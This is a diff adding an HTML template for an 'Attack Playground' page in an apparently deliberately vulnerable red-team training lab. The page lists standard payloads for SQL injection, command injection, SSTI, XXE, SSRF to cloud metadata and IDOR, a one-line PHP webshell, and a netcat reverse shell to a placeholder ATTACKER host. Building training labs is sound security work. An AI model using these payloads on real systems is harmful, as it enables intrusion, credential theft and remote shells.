@@ -1,0 +1,484 @@
+{% extends "base.html" %}
+
+{% block body %}
+<div class="min-h-screen">
+    <!-- Background Effects -->
+    <div class="fixed inset-0 overflow-hidden pointer-events-none -z-10">
+        <div class="absolute -top-40 -right-40 w-80 h-80 bg-red-500/10 rounded-full blur-3xl"></div>
+        <div class="absolute -bottom-40 -left-40 w-80 h-80 bg-cyber-danger/10 rounded-full blur-3xl"></div>
+    </div>
+
+    <div class="container mx-auto px-6 py-8">
+        <!-- Header -->
+        <header class="mb-8">
+            <div class="flex items-center gap-4">
+                <div class="w-14 h-14 rounded-xl bg-gradient-to-br from-red-500/20 to-cyber-danger/20 flex items-center justify-center neon-border border-red-500/30">
+                    <i class="fas fa-skull-crossbones text-red-500 text-2xl"></i>
+                </div>
+                <div>
+                    <h1 class="text-3xl font-bold text-white flex items-center gap-3">
+                        ATTACK <span class="text-red-500">PLAYGROUND</span>
+                    </h1>
+                    <p class="text-gray-400 text-sm mt-1">⚠️ Vulnerable by Design - Red Team Training Lab</p>
+                </div>
+            </div>
+        </header>
+
+        <!-- Warning Banner -->
+        <div class="mb-8 glass rounded-xl p-4 border border-red-500/30 bg-red-500/5">
+            <div class="flex items-center gap-3">
+                <i class="fas fa-exclamation-triangle text-red-500 text-xl"></i>
+                <div>
+                    <p class="text-red-400 font-semibold">⚠️ WARNING: Intentional Vulnerabilities</p>
+                    <p class="text-gray-400 text-sm">Bu sayfa eğitim amaçlı kasıtlı güvenlik açıkları içerir. Production'da kullanmayın!</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Attack Path Cards -->
+        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 mb-8">
+            
+            <!-- SQL Injection -->
+            <div class="glass rounded-2xl overflow-hidden hover-lift transition-all duration-300 border border-red-500/20 hover:border-red-500/40">
+                <div class="px-5 py-4 border-b border-red-500/20 bg-red-500/5">
+                    <h3 class="text-lg font-semibold text-red-500 flex items-center gap-2">
+                        <i class="fas fa-database"></i>
+                        SQL Injection
+                    </h3>
+                    <span class="text-xs text-green-400 bg-green-500/10 px-2 py-1 rounded-full">Easy</span>
+                </div>
+                <div class="p-5">
+                    <p class="text-gray-400 text-sm mb-4">Veritabanı sorgularına müdahale ederek veri sızdırma</p>
+                    <div class="space-y-3">
+                        <div class="bg-white/5 rounded-lg p-3">
+                            <p class="text-xs text-gray-500 mb-1">Test Endpoint:</p>
+                            <code class="text-cyber-primary text-sm">/vuln/sqli?id=1</code>
+                        </div>
+                        <div class="bg-white/5 rounded-lg p-3">
+                            <p class="text-xs text-gray-500 mb-1">Payload:</p>
+                            <code class="text-red-400 text-xs">1' OR '1'='1' --</code>
+                        </div>
+                        <a href="/vuln/sqli?id=1" class="block w-full text-center py-2 rounded-lg bg-red-500/10 text-red-400 hover:bg-red-500/20 transition-colors">
+                            <i class="fas fa-play mr-2"></i>Test Et
+                        </a>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Command Injection -->
+            <div class="glass rounded-2xl overflow-hidden hover-lift transition-all duration-300 border border-orange-500/20 hover:border-orange-500/40">
+                <div class="px-5 py-4 border-b border-orange-500/20 bg-orange-500/5">
+                    <h3 class="text-lg font-semibold text-orange-500 flex items-center gap-2">
+                        <i class="fas fa-terminal"></i>
+                        Command Injection
+                    </h3>
+                    <span class="text-xs text-green-400 bg-green-500/10 px-2 py-1 rounded-full">Easy</span>
+                </div>
+                <div class="p-5">
+                    <p class="text-gray-400 text-sm mb-4">OS komutları çalıştırarak RCE elde etme</p>
+                    <div class="space-y-3">
+                        <div class="bg-white/5 rounded-lg p-3">
+                            <p class="text-xs text-gray-500 mb-1">Test Endpoint:</p>
+                            <code class="text-cyber-primary text-sm">/vuln/cmdi?cmd=id</code>
+                        </div>
+                        <div class="bg-white/5 rounded-lg p-3">
+                            <p class="text-xs text-gray-500 mb-1">Payload:</p>
+                            <code class="text-red-400 text-xs">; cat /etc/passwd</code>
+                        </div>
+                        <a href="/vuln/cmdi?cmd=id" class="block w-full text-center py-2 rounded-lg bg-orange-500/10 text-orange-400 hover:bg-orange-500/20 transition-colors">
+                            <i class="fas fa-play mr-2"></i>Test Et
+                        </a>
+                    </div>
+                </div>
+            </div>
+
+            <!-- SSTI -->
+            <div class="glass rounded-2xl overflow-hidden hover-lift transition-all duration-300 border border-yellow-500/20 hover:border-yellow-500/40">
+                <div class="px-5 py-4 border-b border-yellow-500/20 bg-yellow-500/5">
+                    <h3 class="text-lg font-semibold text-yellow-500 flex items-center gap-2">
+                        <i class="fas fa-code"></i>
+                        SSTI (Template Injection)
+                    </h3>
+                    <span class="text-xs text-yellow-400 bg-yellow-500/10 px-2 py-1 rounded-full">Medium</span>
+                </div>
+                <div class="p-5">
+                    <p class="text-gray-400 text-sm mb-4">Template engine üzerinden kod çalıştırma</p>
+                    <div class="space-y-3">
+                        <div class="bg-white/5 rounded-lg p-3">
+                            <p class="text-xs text-gray-500 mb-1">Test Endpoint:</p>
+                            <code class="text-cyber-primary text-sm">/vuln/ssti?name=test</code>
+                        </div>
+                        <div class="bg-white/5 rounded-lg p-3">
+                            <p class="text-xs text-gray-500 mb-1">Payload:</p>
+                            <code class="text-red-400 text-xs">{{config}}</code>
+                        </div>
+                        <a href="/vuln/ssti?name={{7*7}}" class="block w-full text-center py-2 rounded-lg bg-yellow-500/10 text-yellow-400 hover:bg-yellow-500/20 transition-colors">
+                            <i class="fas fa-play mr-2"></i>Test Et
+                        </a>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Deserialization -->
+            <div class="glass rounded-2xl overflow-hidden hover-lift transition-all duration-300 border border-purple-500/20 hover:border-purple-500/40">
+                <div class="px-5 py-4 border-b border-purple-500/20 bg-purple-500/5">
+                    <h3 class="text-lg font-semibold text-purple-500 flex items-center gap-2">
+                        <i class="fas fa-cube"></i>
+                        Insecure Deserialization
+                    </h3>
+                    <span class="text-xs text-red-400 bg-red-500/10 px-2 py-1 rounded-full">Hard</span>
+                </div>
+                <div class="p-5">
+                    <p class="text-gray-400 text-sm mb-4">Pickle/JSON deserialization ile RCE</p>
+                    <div class="space-y-3">
+                        <div class="bg-white/5 rounded-lg p-3">
+                            <p class="text-xs text-gray-500 mb-1">Test Endpoint:</p>
+                            <code class="text-cyber-primary text-sm">/vuln/deserialize</code>
+                        </div>
+                        <div class="bg-white/5 rounded-lg p-3">
+                            <p class="text-xs text-gray-500 mb-1">Method:</p>
+                            <code class="text-red-400 text-xs">POST pickle payload</code>
+                        </div>
+                        <a href="/vuln/deserialize" class="block w-full text-center py-2 rounded-lg bg-purple-500/10 text-purple-400 hover:bg-purple-500/20 transition-colors">
+                            <i class="fas fa-play mr-2"></i>Test Et
+                        </a>
+                    </div>
+                </div>
+            </div>
+
+            <!-- JWT Weakness -->
+            <div class="glass rounded-2xl overflow-hidden hover-lift transition-all duration-300 border border-blue-500/20 hover:border-blue-500/40">
+                <div class="px-5 py-4 border-b border-blue-500/20 bg-blue-500/5">
+                    <h3 class="text-lg font-semibold text-blue-500 flex items-center gap-2">
+                        <i class="fas fa-key"></i>
+                        JWT Weakness
+                    </h3>
+                    <span class="text-xs text-yellow-400 bg-yellow-500/10 px-2 py-1 rounded-full">Medium</span>
+                </div>
+                <div class="p-5">
+                    <p class="text-gray-400 text-sm mb-4">Zayıf JWT secret ile hesap ele geçirme</p>
+                    <div class="space-y-3">
+                        <div class="bg-white/5 rounded-lg p-3">
+                            <p class="text-xs text-gray-500 mb-1">Test Endpoint:</p>
+                            <code class="text-cyber-primary text-sm">/api/vuln/jwt-login</code>
+                        </div>
+                        <div class="bg-white/5 rounded-lg p-3">
+                            <p class="text-xs text-gray-500 mb-1">Secret:</p>
+                            <code class="text-red-400 text-xs">supersecret123</code>
+                        </div>
+                        <a href="/api/vuln/jwt-login" class="block w-full text-center py-2 rounded-lg bg-blue-500/10 text-blue-400 hover:bg-blue-500/20 transition-colors">
+                            <i class="fas fa-play mr-2"></i>Test Et
+                        </a>
+                    </div>
+                </div>
+            </div>
+
+            <!-- File Upload -->
+            <div class="glass rounded-2xl overflow-hidden hover-lift transition-all duration-300 border border-green-500/20 hover:border-green-500/40">
+                <div class="px-5 py-4 border-b border-green-500/20 bg-green-500/5">
+                    <h3 class="text-lg font-semibold text-green-500 flex items-center gap-2">
+                        <i class="fas fa-upload"></i>
+                        File Upload
+                    </h3>
+                    <span class="text-xs text-green-400 bg-green-500/10 px-2 py-1 rounded-full">Easy</span>
+                </div>
+                <div class="p-5">
+                    <p class="text-gray-400 text-sm mb-4">Webshell yükleyerek RCE</p>
+                    <div class="space-y-3">
+                        <div class="bg-white/5 rounded-lg p-3">
+                            <p class="text-xs text-gray-500 mb-1">Test Endpoint:</p>
+                            <code class="text-cyber-primary text-sm">/vuln/upload</code>
+                        </div>
+                        <div class="bg-white/5 rounded-lg p-3">
+                            <p class="text-xs text-gray-500 mb-1">Upload:</p>
+                            <code class="text-red-400 text-xs">shell.php → webshell</code>
+                        </div>
+                        <a href="/vuln/upload" class="block w-full text-center py-2 rounded-lg bg-green-500/10 text-green-400 hover:bg-green-500/20 transition-colors">
+                            <i class="fas fa-play mr-2"></i>Test Et
+                        </a>
+                    </div>
+                </div>
+            </div>
+
+            <!-- SSRF -->
+            <div class="glass rounded-2xl overflow-hidden hover-lift transition-all duration-300 border border-cyan-500/20 hover:border-cyan-500/40">
+                <div class="px-5 py-4 border-b border-cyan-500/20 bg-cyan-500/5">
+                    <h3 class="text-lg font-semibold text-cyan-500 flex items-center gap-2">
+                        <i class="fas fa-network-wired"></i>
+                        SSRF
+                    </h3>
+                    <span class="text-xs text-yellow-400 bg-yellow-500/10 px-2 py-1 rounded-full">Medium</span>
+                </div>
+                <div class="p-5">
+                    <p class="text-gray-400 text-sm mb-4">İç servisler ve cloud metadata erişimi</p>
+                    <div class="space-y-3">
+                        <div class="bg-white/5 rounded-lg p-3">
+                            <p class="text-xs text-gray-500 mb-1">Test Endpoint:</p>
+                            <code class="text-cyber-primary text-sm">/vuln/ssrf?url=</code>
+                        </div>
+                        <div class="bg-white/5 rounded-lg p-3">
+                            <p class="text-xs text-gray-500 mb-1">Payload:</p>
+                            <code class="text-red-400 text-xs">file:///etc/passwd</code>
+                        </div>
+                        <a href="/vuln/ssrf?url=http://localhost" class="block w-full text-center py-2 rounded-lg bg-cyan-500/10 text-cyan-400 hover:bg-cyan-500/20 transition-colors">
+                            <i class="fas fa-play mr-2"></i>Test Et
+                        </a>
+                    </div>
+                </div>
+            </div>
+
+            <!-- IDOR -->
+            <div class="glass rounded-2xl overflow-hidden hover-lift transition-all duration-300 border border-pink-500/20 hover:border-pink-500/40">
+                <div class="px-5 py-4 border-b border-pink-500/20 bg-pink-500/5">
+                    <h3 class="text-lg font-semibold text-pink-500 flex items-center gap-2">
+                        <i class="fas fa-user-secret"></i>
+                        IDOR
+                    </h3>
+                    <span class="text-xs text-green-400 bg-green-500/10 px-2 py-1 rounded-full">Easy</span>
+                </div>
+                <div class="p-5">
+                    <p class="text-gray-400 text-sm mb-4">Başka kullanıcı verilerine erişim</p>
+                    <div class="space-y-3">
+                        <div class="bg-white/5 rounded-lg p-3">
+                            <p class="text-xs text-gray-500 mb-1">Test Endpoint:</p>
+                            <code class="text-cyber-primary text-sm">/api/vuln/user/1</code>
+                        </div>
+                        <div class="bg-white/5 rounded-lg p-3">
+                            <p class="text-xs text-gray-500 mb-1">Change ID:</p>
+                            <code class="text-red-400 text-xs">/api/vuln/user/2 (admin)</code>
+                        </div>
+                        <a href="/api/vuln/user/1" class="block w-full text-center py-2 rounded-lg bg-pink-500/10 text-pink-400 hover:bg-pink-500/20 transition-colors">
+                            <i class="fas fa-play mr-2"></i>Test Et
+                        </a>
+                    </div>
+                </div>
+            </div>
+
+            <!-- XXE -->
+            <div class="glass rounded-2xl overflow-hidden hover-lift transition-all duration-300 border border-indigo-500/20 hover:border-indigo-500/40">
+                <div class="px-5 py-4 border-b border-indigo-500/20 bg-indigo-500/5">
+                    <h3 class="text-lg font-semibold text-indigo-500 flex items-center gap-2">
+                        <i class="fas fa-file-code"></i>
+                        XXE Injection
+                    </h3>
+                    <span class="text-xs text-yellow-400 bg-yellow-500/10 px-2 py-1 rounded-full">Medium</span>
+                </div>
+                <div class="p-5">
+                    <p class="text-gray-400 text-sm mb-4">XML External Entity ile dosya okuma</p>
+                    <div class="space-y-3">
+                        <div class="bg-white/5 rounded-lg p-3">
+                            <p class="text-xs text-gray-500 mb-1">Test Endpoint:</p>
+                            <code class="text-cyber-primary text-sm">/vuln/xxe</code>
+                        </div>
+                        <div class="bg-white/5 rounded-lg p-3">
+                            <p class="text-xs text-gray-500 mb-1">Payload:</p>
+                            <code class="text-red-400 text-xs">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</code>
+                        </div>
+                        <a href="/vuln/xxe" class="block w-full text-center py-2 rounded-lg bg-indigo-500/10 text-indigo-400 hover:bg-indigo-500/20 transition-colors">
+                            <i class="fas fa-play mr-2"></i>Test Et
+                        </a>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+
+        <!-- Attack Chains Section -->
+        <div class="glass rounded-2xl overflow-hidden neon-border border-red-500/20 mb-8">
+            <div class="px-6 py-4 border-b border-red-500/20 bg-red-500/5">
+                <h3 class="text-lg font-semibold text-red-500 flex items-center gap-2">
+                    <i class="fas fa-link"></i>
+                    ATTACK CHAINS - Senaryolar
+                </h3>
+            </div>
+            <div class="p-6">
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                    
+                    <!-- Chain 1: SQLi to Data Leak -->
+                    <div class="bg-white/5 rounded-xl p-4 border border-white/10">
+                        <h4 class="text-cyber-primary font-semibold mb-2 flex items-center gap-2">
+                            <span class="w-6 h-6 rounded-full bg-cyber-primary/20 flex items-center justify-center text-xs">1</span>
+                            SQLi → Data Dump
+                        </h4>
+                        <div class="flex items-center gap-2 text-sm text-gray-400 mb-3">
+                            <span class="px-2 py-1 rounded bg-red-500/10 text-red-400">SQLi</span>
+                            <i class="fas fa-arrow-right text-xs"></i>
+                            <span class="px-2 py-1 rounded bg-orange-500/10 text-orange-400">UNION</span>
+                            <i class="fas fa-arrow-right text-xs"></i>
+                            <span class="px-2 py-1 rounded bg-yellow-500/10 text-yellow-400">Data Exfil</span>
+                        </div>
+                        <code class="block text-xs text-gray-500 bg-black/30 p-2 rounded font-mono">
+                            /vuln/sqli?id=1' UNION SELECT * FROM users--
+                        </code>
+                    </div>
+
+                    <!-- Chain 2: CMDi to RCE -->
+                    <div class="bg-white/5 rounded-xl p-4 border border-white/10">
+                        <h4 class="text-orange-500 font-semibold mb-2 flex items-center gap-2">
+                            <span class="w-6 h-6 rounded-full bg-orange-500/20 flex items-center justify-center text-xs">2</span>
+                            CMDi → Reverse Shell
+                        </h4>
+                        <div class="flex items-center gap-2 text-sm text-gray-400 mb-3">
+                            <span class="px-2 py-1 rounded bg-orange-500/10 text-orange-400">CMDi</span>
+                            <i class="fas fa-arrow-right text-xs"></i>
+                            <span class="px-2 py-1 rounded bg-red-500/10 text-red-400">nc</span>
+                            <i class="fas fa-arrow-right text-xs"></i>
+                            <span class="px-2 py-1 rounded bg-purple-500/10 text-purple-400">Shell</span>
+                        </div>
+                        <code class="block text-xs text-gray-500 bg-black/30 p-2 rounded font-mono">
+                            /vuln/cmdi?cmd=;nc -e /bin/sh ATTACKER 4444
+                        </code>
+                    </div>
+
+                    <!-- Chain 3: SSTI to RCE -->
+                    <div class="bg-white/5 rounded-xl p-4 border border-white/10">
+                        <h4 class="text-yellow-500 font-semibold mb-2 flex items-center gap-2">
+                            <span class="w-6 h-6 rounded-full bg-yellow-500/20 flex items-center justify-center text-xs">3</span>
+                            SSTI → Config Leak → RCE
+                        </h4>
+                        <div class="flex items-center gap-2 text-sm text-gray-400 mb-3">
+                            <span class="px-2 py-1 rounded bg-yellow-500/10 text-yellow-400">SSTI</span>
+                            <i class="fas fa-arrow-right text-xs"></i>
+                            <span class="px-2 py-1 rounded bg-cyan-500/10 text-cyan-400">__class__</span>
+                            <i class="fas fa-arrow-right text-xs"></i>
+                            <span class="px-2 py-1 rounded bg-red-500/10 text-red-400">os.popen</span>
+                        </div>
+                        <code class="block text-xs text-gray-500 bg-black/30 p-2 rounded font-mono overflow-x-auto">
+                            {{''.__class__.__mro__[1].__subclasses__()[..].popen('id')}}
+                        </code>
+                    </div>
+
+                    <!-- Chain 4: JWT to Admin -->
+                    <div class="bg-white/5 rounded-xl p-4 border border-white/10">
+                        <h4 class="text-blue-500 font-semibold mb-2 flex items-center gap-2">
+                            <span class="w-6 h-6 rounded-full bg-blue-500/20 flex items-center justify-center text-xs">4</span>
+                            JWT Crack → Admin Takeover
+                        </h4>
+                        <div class="flex items-center gap-2 text-sm text-gray-400 mb-3">
+                            <span class="px-2 py-1 rounded bg-blue-500/10 text-blue-400">JWT</span>
+                            <i class="fas fa-arrow-right text-xs"></i>
+                            <span class="px-2 py-1 rounded bg-green-500/10 text-green-400">Crack</span>
+                            <i class="fas fa-arrow-right text-xs"></i>
+                            <span class="px-2 py-1 rounded bg-red-500/10 text-red-400">Forge</span>
+                        </div>
+                        <code class="block text-xs text-gray-500 bg-black/30 p-2 rounded font-mono">
+                            jwt_tool token -C -d rockyou.txt
+                        </code>
+                    </div>
+
+                    <!-- Chain 5: Upload to Webshell -->
+                    <div class="bg-white/5 rounded-xl p-4 border border-white/10">
+                        <h4 class="text-green-500 font-semibold mb-2 flex items-center gap-2">
+                            <span class="w-6 h-6 rounded-full bg-green-500/20 flex items-center justify-center text-xs">5</span>
+                            Upload → Webshell → RCE
+                        </h4>
+                        <div class="flex items-center gap-2 text-sm text-gray-400 mb-3">
+                            <span class="px-2 py-1 rounded bg-green-500/10 text-green-400">Upload</span>
+                            <i class="fas fa-arrow-right text-xs"></i>
+                            <span class="px-2 py-1 rounded bg-purple-500/10 text-purple-400">.php</span>
+                            <i class="fas fa-arrow-right text-xs"></i>
+                            <span class="px-2 py-1 rounded bg-red-500/10 text-red-400">RCE</span>
+                        </div>
+                        <code class="block text-xs text-gray-500 bg-black/30 p-2 rounded font-mono">
+                            &lt;?php system($_GET['cmd']); ?&gt;
+                        </code>
+                    </div>
+
+                    <!-- Chain 6: SSRF to Cloud -->
+                    <div class="bg-white/5 rounded-xl p-4 border border-white/10">
+                        <h4 class="text-cyan-500 font-semibold mb-2 flex items-center gap-2">
+                            <span class="w-6 h-6 rounded-full bg-cyan-500/20 flex items-center justify-center text-xs">6</span>
+                            SSRF → Cloud Metadata → Keys
+                        </h4>
+                        <div class="flex items-center gap-2 text-sm text-gray-400 mb-3">
+                            <span class="px-2 py-1 rounded bg-cyan-500/10 text-cyan-400">SSRF</span>
+                            <i class="fas fa-arrow-right text-xs"></i>
+                            <span class="px-2 py-1 rounded bg-orange-500/10 text-orange-400">169.254</span>
+                            <i class="fas fa-arrow-right text-xs"></i>
+                            <span class="px-2 py-1 rounded bg-yellow-500/10 text-yellow-400">IAM</span>
+                        </div>
+                        <code class="block text-xs text-gray-500 bg-black/30 p-2 rounded font-mono overflow-x-auto">
+                            /vuln/ssrf?url=http://169.254.169.254/latest/meta-data/
+                        </code>
+                    </div>
+
+                </div>
+            </div>
+        </div>
+
+        <!-- Interactive Test Forms -->
+        <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+            
+            <!-- SQLi Tester -->
+            <div class="glass rounded-2xl overflow-hidden neon-border">
+                <div class="px-6 py-4 border-b border-red-500/20 bg-red-500/5">
+                    <h3 class="text-lg font-semibold text-red-500 flex items-center gap-2">
+                        <i class="fas fa-database"></i>
+                        SQL Injection Tester
+                    </h3>
+                </div>
+                <div class="p-6">
+                    <form action="/vuln/sqli" method="get" class="space-y-4">
+                        <div>
+                            <label class="block text-sm text-gray-400 mb-2">ID Parameter:</label>
+                            <input type="text" name="id" value="1" 
+                                   class="w-full px-4 py-3 rounded-xl bg-white/5 border border-white/10 text-white font-mono focus:outline-none focus:border-red-500/50">
+                        </div>
+                        <div class="grid grid-cols-2 gap-2">
+                            <button type="button" onclick="this.form.id.value=&quot;1' OR '1'='1&quot;" class="py-2 rounded-lg bg-white/5 text-gray-300 hover:bg-white/10 text-sm">
+                                OR Bypass
+                            </button>
+                            <button type="button" onclick="this.form.id.value=&quot;1' UNION SELECT 1,2,3--&quot;" class="py-2 rounded-lg bg-white/5 text-gray-300 hover:bg-white/10 text-sm">
+                                UNION
+                            </button>
+                        </div>
+                        <button type="submit" class="w-full py-3 rounded-xl bg-red-500/20 text-red-400 hover:bg-red-500/30 transition-colors">
+                            <i class="fas fa-bolt mr-2"></i>Execute
+                        </button>
+                    </form>
+                </div>
+            </div>
+
+            <!-- CMDi Tester -->
+            <div class="glass rounded-2xl overflow-hidden neon-border">
+                <div class="px-6 py-4 border-b border-orange-500/20 bg-orange-500/5">
+                    <h3 class="text-lg font-semibold text-orange-500 flex items-center gap-2">
+                        <i class="fas fa-terminal"></i>
+                        Command Injection Tester
+                    </h3>
+                </div>
+                <div class="p-6">
+                    <form action="/vuln/cmdi" method="get" class="space-y-4">
+                        <div>
+                            <label class="block text-sm text-gray-400 mb-2">Command:</label>
+                            <input type="text" name="cmd" value="id" 
+                                   class="w-full px-4 py-3 rounded-xl bg-white/5 border border-white/10 text-white font-mono focus:outline-none focus:border-orange-500/50">
+                        </div>
+                        <div class="grid grid-cols-2 gap-2">
+                            <button type="button" onclick="this.form.cmd.value='id; whoami'" class="py-2 rounded-lg bg-white/5 text-gray-300 hover:bg-white/10 text-sm">
+                                ; whoami
+                            </button>
+                            <button type="button" onclick="this.form.cmd.value='id && cat /etc/passwd'" class="py-2 rounded-lg bg-white/5 text-gray-300 hover:bg-white/10 text-sm">
+                                && passwd
+                            </button>
+                        </div>
+                        <button type="submit" class="w-full py-3 rounded-xl bg-orange-500/20 text-orange-400 hover:bg-orange-500/30 transition-colors">
+                            <i class="fas fa-bolt mr-2"></i>Execute
+                        </button>
+                    </form>
+                </div>
+            </div>
+
+        </div>
+
+        <!-- Back to Dashboard -->
+        <div class="mt-8 text-center">
+            <a href="/" class="inline-flex items-center gap-2 px-6 py-3 rounded-xl bg-white/5 text-gray-300 hover:bg-white/10 transition-colors">
+                <i class="fas fa-arrow-left"></i>
+                Back to Dashboard
+            </a>
+        </div>
+
+    </div>
+</div>
+{% endblock %}
